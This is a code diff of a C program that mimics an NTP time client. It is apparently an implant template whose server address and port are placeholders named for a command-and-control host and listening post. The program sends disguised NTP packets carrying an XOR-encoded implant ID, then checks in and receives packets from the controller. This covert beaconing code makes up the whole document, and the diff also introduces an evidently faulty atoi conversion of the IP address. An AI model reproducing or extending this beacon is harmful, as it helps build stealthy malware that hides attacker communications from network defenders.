@@ -1,8 +1,9 @@
-//#define NTP_SERVER "XXX.XXX.XXX.XXX"
-//#define NTP_PORT 12345
-#define NTP_SERVER "127.0.0.1"
-#define NTP_PORT 123
-#define ID 1
+#define NTP_SERVER "${C2_IPID}"
+#define NTP_PORT "${LP_PORT}"
+#define ID "${ID}"
+//#define NTP_SERVER "127.000.000.001"
+//#define NTP_PORT "0000000123"
+//#define ID "00000"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -29,14 +30,14 @@ int main() {
     sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
     bzero(&servaddr, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
-    servaddr.sin_addr.s_addr=inet_addr(NTP_SERVER);
-    servaddr.sin_port=htons(NTP_PORT);
+    servaddr.sin_addr.s_addr=atoi(NTP_SERVER);
+    servaddr.sin_port=htons(atoi(NTP_PORT));
 
     while (1) {
         memset(buffer, 0, 48);
         buffer[0] = 0xe3;
 
-        a = ID;
+        a = atoi(ID);
         delta = (unsigned int)time(NULL) + NTP_TIMESTAMP_DELTA;
         *(unsigned int *)(buffer + 40) = htonl(delta);
         *(unsigned int *)(buffer + 44) = a ^ delta;
@@ -61,7 +62,7 @@ int main() {
                 connect(sock_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
 
                 // Check in with ID
-                a = ID;
+                a = atoi(ID);
                 sendto(sock_fd, &a, 4, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
 
                 // Receive initial packet
